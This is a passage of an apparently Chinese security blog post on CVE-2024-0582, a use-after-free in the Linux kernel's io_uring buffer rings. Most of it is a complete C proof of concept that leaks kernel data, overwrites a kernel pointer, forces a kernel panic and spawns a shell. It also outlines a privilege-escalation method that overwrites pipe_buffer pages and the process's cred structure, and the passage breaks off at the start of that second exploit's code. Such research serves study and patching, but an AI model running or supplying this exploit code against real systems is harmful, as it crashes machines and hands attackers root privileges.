class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> IS_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PTR_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESSS_MSG(msg) <span class="hljs-string">&quot;\033[32m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg) <span class="hljs-string">&quot;\033[34m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_MSG(msg) <span class="hljs-string">&quot;\033[31m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(INFO_MSG(<span class="hljs-string">&quot;[*] Process binded to core: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-keyword">struct</span> io_uring_buf_ring*<br><span class="hljs-title function_">setup_pbuf_ring_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring *ring, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_entries,</span><br><span class="hljs-params">                     <span class="hljs-type">int</span> bgid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> *retp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_ring</span> *<span class="hljs-title">buf_ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">buf_reg</span>;</span><br>    <span class="hljs-type">size_t</span> ring_size;<br>    <span class="hljs-type">off_t</span> offset;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-built_in">memset</span>(&amp;buf_reg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf_reg));<br><br>    <span class="hljs-comment">/* we don&#x27;t need to set reg.addr for IOU_PBUF_RING_MMAP */</span><br>    buf_reg.ring_entries = ring_entries;<br>    buf_reg.bgid = bgid;<br>    buf_reg.flags = IOU_PBUF_RING_MMAP;<br><br>    ret = io_uring_register_buf_ring(ring, &amp;buf_reg, flags);<br>    <span class="hljs-keyword">if</span> (ret) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error occur while doing io_uring_register_buf_ring&quot;</span>));<br>        *retp = ret;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment"> [chr(int(i,16))for i in[&#x27;3361626e74747261&#x27;[i:i+2]for i in range(0,16,2)]][::-1]</span><br><span class="hljs-comment">    **/</span><br>    offset = IORING_OFF_PBUF_RING | (<span class="hljs-type">uint64_t</span>) bgid &lt;&lt; IORING_OFF_PBUF_SHIFT;<br>    ring_size = ring_entries * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf);<br>    buf_ring = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        ring_size,<br>        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,<br>        ring-&gt;ring_fd,<br>        offset<br>    );<br><br>    <span class="hljs-keyword">if</span> (IS_ERR(buf_ring)) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error occur while doing mmap() for io_uring&quot;</span>));<br>        *retp = PTR_ERR(buf_ring);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    *retp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> buf_ring;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NR_PAGES    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NR_BUFFERS  0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NR 0x200</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">proof_of_concept</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-type">void</span> **buffers;<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NR], found = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-built_in">puts</span>(SUCCESSS_MSG(<span class="hljs-string">&quot;-------- CVE-2024-0582 Proof-of-concet --------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(INFO_MSG(<span class="hljs-string">&quot;-------\t\t Author: &quot;</span>) <span class="hljs-string">&quot;arttnba3&quot;</span> INFO_MSG(<span class="hljs-string">&quot; \t-------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(SUCCESSS_MSG(<span class="hljs-string">&quot;-----------------------------------------------\n&quot;</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Preparing...&quot;</span>);<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (io_uring_queue_init(<span class="hljs-number">4</span>, &amp;ring, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERR_MSG(<span class="hljs-string">&quot;[x] Unable to init for io_uring queue&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating pbuf ring and doing mmap()...&quot;</span>);<br><br>    buffers = <span class="hljs-built_in">calloc</span>(NR_BUFFERS, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i++) &#123;<br>        buffers[i] = setup_pbuf_ring_mmap(<br>            &amp;ring,<br>            NR_PAGES * PAGE_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf),<br>            i,<br>            <span class="hljs-number">0</span>,<br>            &amp;ret<br>        );<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to set up&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pbuf ring, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        io_uring_buf_ring_init(buffers[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering page-level UAF vulnerabilities...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i++) &#123;<br>        ret = io_uring_unregister_buf_ring(&amp;ring, i);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to unregister&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pbuf ring, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reallocating page into seq_file::seq_operations...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SEQ_FILE_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to open&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;seq file, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                seq_fd[i]<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking data leak and overwriting...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> *buffer = buffers[i];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (NR_PAGES * PAGE_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)); j++) &#123;<br>            <span class="hljs-keyword">if</span> (buffer[j]&gt;<span class="hljs-number">0xffffffff80000000</span> &amp;&amp; buffer[j]&lt;<span class="hljs-number">0xfffffffff0000000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<br>                    SUCCESSS_MSG(<span class="hljs-string">&quot;[+] Got kernel data leak:&quot;</span>) <span class="hljs-string">&quot; %lx &quot;</span><br>                    SUCCESSS_MSG(<span class="hljs-string">&quot;at location &quot;</span>) <span class="hljs-string">&quot;%d-%d\n&quot;</span>,<br>                    buffer[j],<br>                    i,<br>                    j<br>                );<br>                buffer[j] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>                found = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!found) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Failed to reallocate UAF page as seq_operations!&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>out:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering kernel panic...&quot;</span>);<br><br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SEQ_FILE_NR; i++) &#123;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br>        read(seq_fd[i], buf, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[?] So you&#x27;re still alive here!?&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    proof_of_concept();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行，成功造成 kernel panic：</p><p><img src="https://s2.loli.net/2025/03/13/1z9IqkSWFUQst5r.png"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02. 漏洞利用"></a>0x02. 漏洞利用</h1><p>这个 UAF 可谓是相当的白给，其来自于非常常见的分配 page 的 API，并且可以在用户空间直接读写 UAF page，所以利用方式基本上可以说是多种多样的， <strong>可谓是想怎么利用就怎么利用，而且还特别稳定</strong> </p><p>这里笔者直接用 page-level UAF 通过改写 <code>pipe_buffer::page</code> 的方式获取内核空间任意读写的权能，之后直接改写当前进程的 <code>cred</code> 结构体完成提权：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> IS_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PTR_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESS_MSG(msg) <span class="hljs-string">&quot;\033[32m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg) <span class="hljs-string">&quot;\033[34m\033[1m&quot;</span> msg <span 